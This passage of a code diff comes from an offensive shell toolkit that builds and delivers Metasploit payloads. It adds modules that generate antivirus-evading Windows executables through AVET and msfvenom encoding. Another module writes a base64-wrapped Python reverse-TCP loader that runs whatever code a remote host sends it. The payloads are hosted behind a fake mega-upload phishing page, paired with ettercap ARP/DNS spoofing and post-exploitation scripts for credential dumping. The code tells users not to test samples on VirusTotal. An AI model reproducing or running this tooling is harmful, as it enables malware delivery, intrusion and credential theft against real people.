+      echo "---"
+      echo "- SEND THE URL GENERATED TO TARGET HOST"
+
+        if [ "$D0M4IN" = "YES" ]; then
+        # copy files nedded by mitm+dns_spoof module
+        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
+        echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "- POST EXPLOIT : $P0"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
+          sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+          else
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
+
+        else
+
+
+        echo "- ATTACK VECTOR: http://$lhost"
+        echo "- POST EXPLOIT : $P0"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
+            sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
+          fi
+        fi
+   fi
+
+
+else
+
+
+  echo "[x] Abort execution .."
+  sleep 2
+fi
+
+sleep 2
+# CLEANING EVERYTHING UP
+echo "[☠] Cleanning temp generated files..."
+rm $IPATH/output/chars.raw > /dev/null 2>&1
+rm $ApAcHe/$N4m.exe > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+sleep 2
+clear
+cd $IPATH/
+}
+
+
+
+
+
+# ------------------------------
+# C - AVET to EXE shellcode  FUD 
+# ------------------------------
+sh_shellcode24 () {
+# module description
+cat << !
+
+    ╔─────────────────────────────────────────────────────────────╗
+    |   This module uses AVET to obfuscate sourcecode (evade AV)  |
+    |   Author: Daniel Sauder (Blackhat USA Edition 2017)         |
+    |                                                             |
+    |  Detection ratio:                                           |
+    |  https://nodistribute.com/result/ENZ1b6R2TrYocWHCzy9fwMuQs  |
+    ╚─────────────────────────────────────────────────────────────╝
+
+!
+sleep 2
+# run module or abort ? 
+QuE=$(zenity --question --title="☠ AVET AV evasion ☠" --text "Author: Daniel Sauder\nRun avet module?" --width 240) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+#
+# Check if dependencies are installed ..
+# check if MinGw EXE exists ..
+#
+which mingw-gcc > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+  echo "[☠] MinGw EXE compiler found .."
+  sleep 2
+else
+  echo "[x] MinGw EXE compiler not found .."
+  sleep 2
+    #
+    # check if files/directory exist ..
+    #
+    if [ -e "/usr/bin/mingw-gcc" ]; then
+      rm /usr/bin/mingw-gcc > /dev/null 2>&1
+    fi
+    if [ -d "$DrIvC/MinGW" ]; then
+      rm -r $DrIvC/MinGW > /dev/null 2>&1
+    fi
+    echo "[☠] Installing MinGw EXE compiler .."
+    cd $IPATH/obfuscate/
+    xterm -T "Donwloading MinGw EXE compiller" -geometry 124x26 -e "wget https://downloads.sourceforge.net/project/mingw/Installer/mingw-get-setup.exe"
+    xterm -T "Installing MinGw EXE compiller" -geometry 124x26 -e "$arch mingw-get-setup.exe"
+  #
+  # Building minGW diectory ..
+  #
+  echo "#!/bin/sh" >> /usr/bin/mingw-gcc
+  echo "cd $DrIvC/MinGW/bin" >> /usr/bin/mingw-gcc
+  echo "exec wine gcc.exe \"\$@\"" >> /usr/bin/mingw-gcc
+  chmod +x /usr/bin/mingw-gcc
+  echo "[✔] Done installing MinGW .."
+  rm mingw-get-setup.exe > /dev/null 2>&1
+  cd $IPATH/
+  sleep 2
+fi
+#
+# Install avet obfuscated software ..
+#
+if [ -e "$IPATH/obfuscate/avet/make_avet" ]; then
+  echo "[☠] avet obfuscator found .."
+  sleep 2
+else
+  echo "[x] avet obfuscator not found .."
+  sleep 2
+  echo "[☠] Installing avet software .."
+  sleep 1
+    #
+    # build avet ..
+    #
+    if [ -d $IPATH/obfuscate/avet ]; then
+      rm -r $IPATH/obfuscate/avet > /dev/null 2>&1
+    fi
+    cd $IPATH/obfuscate/
+    xterm -T "Installing avet software" -geometry 124x26 -e "git clone https://github.com/govolution/avet.git && sleep 2"
+  #
+  # Build avet files ..
+  #
+  cd $IPATH/obfuscate/avet
+  gcc make_avet.c -o make_avet
+  gcc sh_format.c -o sh_format
+  echo "[✔] Done installing avet .."
+  sleep 2
+  cd $IPATH/
+fi
+
+
+#
+# Get user input to build shellcode ..
+#
+echo "[☠] Enter shellcode settings!"
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+interactions=$(zenity --title="☠ Enter ENCODER interactions ☠" --text "example: 3" --entry --width 300) > /dev/null 2>&1
+# input payload choise
+paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 290) > /dev/null 2>&1
+
+
+echo "[☠] Building shellcode -> C format .."
+sleep 2
+# display final settings to user
+cat << !
+
+ shellcode settings
++------------------
+| LPORT   : $lport
+| LHOST   : $lhost
+| FORMAT  : C -> WINDOWS(EXE)
+|_PAYLOAD : $paylo
+
+!
+#
+# Use metasploit to build shellcode (msf encoded)
+# https://nodistribute.com/result/YCHgomiEkJrI3BcbtjvGsuexKVp842 (3/39) with -i 3
+# https://nodistribute.com/result/ENZ1b6R2TrYocWHCzy9fwMuQs (0/39) FUD with -F -E
+#
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/shikata_ga_nai -i $interactions -f c -o $IPATH/obfuscate/avet/template.txt"
+
+
+echo ""
+# display generated code
+cat $IPATH/obfuscate/avet/template.txt
+echo "" && echo ""
+sleep 2
+
+
+# EDITING/BACKUP FILES NEEDED
+N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
+echo "[☠] Editing/backup files .."
+sleep 2
+
+
+#
+# We can reuse the template.txt from the previous example for decoding the shellcode:
+#
+echo "[☠] Decoding shellcode with avet .."
+sleep 2
+cd $IPATH/obfuscate/avet
+if [ -e "$IPATH/obfuscate/avet/defs.h" ]; then
+  rm $IPATH/obfuscate/avet/defs.h > /dev/null 2>&1
+fi
+#
+# (decoding/obfuscation)
+#
+xterm -T "DECODING/OBFUSCATING SOURCECODE" -geometry 110x20 -e "./format.sh template.txt > scclean.txt && sleep 2"
+rm $IPATH/obfuscate/avet/template.txt
+mv scclean.txt template.txt
+echo "[☠] Obfuscating shellcode with avet .."
+sleep 1
+./make_avet -f template.txt -F -E
+echo "[☠] Compiling shellcode to exe .."
+sleep 2
+sudo mingw-gcc -o $IPATH/output/$N4m.exe $IPATH/obfuscate/avet/avet.c -lws2_32 -mwindows
+cd $IPATH/
+sleep 2
+
+
+#
+# CHOSE HOW TO DELIVER YOUR PAYLOAD
+#
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1
+
+
+   if [ "$serv" = "multi-handler (default)" ]; then
+      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
+          sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; exploit'"
+        fi
+      sleep 2
+
+
+   else
+
+
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 320) > /dev/null 2>&1
+
+
+  if [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+  fi
+
+
+      # edit files nedded
+      cd $IPATH/templates/phishing
+      cp $InJEc12 mega[bak].html
+      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
+      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
+      cd $IPATH/output
+      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
+      echo "[☠] loading -> Apache2Server!"
+      echo "---"
+      echo "- SEND THE URL GENERATED TO TARGET HOST"
+
+        if [ "$D0M4IN" = "YES" ]; then
+        # copy files nedded by mitm+dns_spoof module
+        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
+        echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "- POST EXPLOIT : $P0"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
+          sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+          else
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
+
+        else
+
+
+        echo "- ATTACK VECTOR: http://$lhost"
+        echo "- POST EXPLOIT : $P0"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
+            sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
+        fi
+   fi
+
+
+else
+
+
+  echo "[x] Abort execution .."
+  sleep 2
+fi
+
+# CLEANING EVERYTHING UP
+echo "[☠] Cleanning temp generated files .."
+sleep 2
+rm $ApAcHe/$N4m.exe > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
+# cleanup avet old files ..
+rm $IPATH/obfuscate/avet/template.txt > /dev/null 2>&1
+rm $IPATH/obfuscate/avet/defs.h > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -5861,11 +7393,394 @@ cd $IPATH/
 
 
 
+
+# ------------------------------
+# PYTHON - UUID+BASE64 encoding
+# ------------------------------
+sh_shellcode26 () {
+# module description
+cat << !
+
+    ╔─────────────────────────────────────────────────────────────╗
+    |This module uses random UUIDkeys to evade signature detection|
+    |                                                             |
+    |  Detection ratio:                                           |
+    |  https://nodistribute.com/result/9zMSmqJkyouWjUw            |
+    ╚─────────────────────────────────────────────────────────────╝
+
+!
+sleep 2
+# run module or abort ? 
+QuE=$(zenity --question --title="☠ UUID random keys evasion ☠" --text "Author: r00t-3xp10it/null-byte\nRun uuid module?" --width 240) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+# get user input to build shellcode
+echo "[☠] Enter shellcode settings!"
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
+
+
+echo "[☠] Building shellcode -> PYTHON format .."
+sleep 2
+# display final settings to user
+cat << !
+
+ shellcode settings
++------------------
+| LPORT   : $lport
+| LHOST   : $lhost
+| FORMAT  : PYTHON -> MULTI OS
+|_PAYLOAD : python/meterpreter/reverse_tcp
+
+!
+
+
+# EDITING/BACKUP FILES NEEDED
+echo "[☠] editing/backup files .."
+sleep 2
+
+
+#
+# Template ramdom keys ..
+# HINT: adding ramdom comments to source code
+# will help evading AVs signature detection (nullbite) 
+# "a computer can never outsmart a always changing virus" 
+#
+NEW_UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
+NEW_UUID_2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
+NEW_UUID_3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
+NEW_UUID_4=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
+NEW_UUID_5=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
+NEW_UUID_6=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
+
+
+#
+# Build python Template (random UUID keys)
+#
+cd $IPATH/output
+echo "[✔] Using random UUID keys (evade signature detection)"
+sleep 2
+echo "[☠] build routine (raw) .."
+sleep 2
+echo "import socket,struct,time" > routine
+echo "# $NEW_UUID_1" >> routine
+echo "for x in range(10):" >> routine
+echo "# $NEW_UUID_2" >> routine
+echo "	try:" >> routine
+echo "# $NEW_UUID_3" >> routine
+echo "		s=socket.socket(2,socket.SOCK_STREAM)" >> routine
+echo "# $NEW_UUID_4" >> routine
+echo "		s.connect(('$lhost',$lport))" >> routine
+echo "# $NEW_UUID_5" >> routine
+echo "		break" >> routine
+echo "# $NEW_UUID_6" >> routine
+echo "	except:" >> routine
+echo "# $NEW_UUID_1" >> routine
+echo "		time.sleep(5)" >> routine
+echo "# $NEW_UUID_2" >> routine
+echo "l=struct.unpack('>I',s.recv(4))[0]" >> routine
+echo "# $NEW_UUID_3" >> routine
+echo "d=s.recv(l)" >> routine
+echo "# $NEW_UUID_4" >> routine
+echo "while len(d)<l:" >> routine
+echo "# $NEW_UUID_5" >> routine
+echo "	d+=s.recv(l-len(d))" >> routine
+echo "# $NEW_UUID_6" >> routine
+echo "exec(d,{'s':s})" >> routine
+
+
+
+#
+# base64 routine encoding
+#
+echo "[☠] base64 routine encoding .."
+sleep 2
+enc=`cat routine`
+store=`echo "$enc" | base64 | tr -d '\n'`
+
+
+
+#
+# build template.py (final agent)
+#
+echo "[☠] build base64 $N4m.py agent .."
+sleep 2
+echo "# python  template | Author: r00t-3xp10it" > $IPATH/output/template.py
+echo "# UUID obfuscation by: null-byte" >> $IPATH/output/template.py
+echo "# execute: python $N4m.py" >> $IPATH/output/template.py
+echo "# ---" >> $IPATH/output/template.py
+echo "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('$store')))" >> $IPATH/output/template.py
+
+
+
+#
+# make the file 'executable' ..
+#
+mv template.py $N4m.py > /dev/null 2>&1
+chmod +x $N4m.py > /dev/null 2>&1
+
+
+
+#
+# CHOSE HOW TO DELIVER YOUR PAYLOAD
+#
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.py\n\nchose how to deliver: $N4m.py" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1
+
+
+   if [ "$serv" = "multi-handler (default)" ]; then
+      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
+          sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
+        fi
+      sleep 2
+
+
+   else
+
+
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_linux.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 350) > /dev/null 2>&1
+
+
+
+  if [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      #
+      # TODO: if used IEXdownload() in Invoke-Phant0m.rb then
+      # sed "s|RePlAcE|$lhost|" Invoke-Phant0m.rb > copy.rb
+      # mv $IPATH/aux/copy.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      #
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        #
+        # TODO: if used IEXdownload() in Invoke-Phant0m.rb then
+        # cp $IPATH/aux/Invoke-Phant0m.ps1 $ApAcHe/Invoke-Phant0m.ps1 > /dev/null 2>&1
+        #
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+
+  elif [ "$P0" = "post_linux.rc" ]; then
+    # store metasploit post exploit directory structure
+    CHeK_PoSt=`cat $IPATH/settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
+    if [ -e "$CHeK_PoSt/linux/gather/wifi_dump_linux.rb" ]; then
+      echo "[✔] wifi_dump_linux.rb -> found"
+      sleep 2
+    else
+      echo "[x] wifi_dump_linux.rb -> not found"
+      sleep 1
+      echo "    copy post-module to msfdb .."
+      cp $IPATH/aux/wifi_dump_linux.rb $CHeK_PoSt/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+  else
+    :
+  fi
+
+
+      # edit files nedded
+      cd $IPATH/templates/phishing
+      cp $InJEc12 mega[bak].html
+      sed "s|NaM3|$N4m.py|g" mega.html > copy.html
+      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
+      cd $IPATH/output
+      cp $N4m.py $ApAcHe/$N4m.py > /dev/null 2>&1
+      echo "[☠] loading -> Apache2Server!"
+      echo "---"
+      echo "- SEND THE URL GENERATED TO TARGET HOST"
+
+        if [ "$D0M4IN" = "YES" ]; then
+        # copy files nedded by mitm+dns_spoof module
+        sed "s|NaM3|$N4m.py|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.py $ApAcHe/$N4m.py
+        echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "- POST EXPLOIT : $P0"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
